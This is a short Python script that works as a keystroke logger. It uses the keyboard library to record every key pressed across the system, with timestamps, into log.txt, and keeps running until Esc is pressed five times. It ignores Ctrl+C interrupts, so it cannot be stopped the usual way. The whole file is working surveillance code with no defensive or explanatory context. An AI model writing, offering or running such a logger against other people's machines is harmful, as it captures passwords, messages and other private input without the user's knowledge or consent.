from keyboard import *
from time import *
count = 0
print(strftime('{0} %A, %B %d, %Y {0}\n'.format(50 * '='), localtime()), file=open('log.txt', 'a'))
while count != 5:
	try:
		r = read_hotkey(False)
		if r == 'esc':
			count += 1
		print(strftime('%I : %M : %S', localtime()), r, file=open('log.txt', 'a'), sep=' -> ')
	except KeyboardInterrupt:
		continue
	except EOFError:
		continue
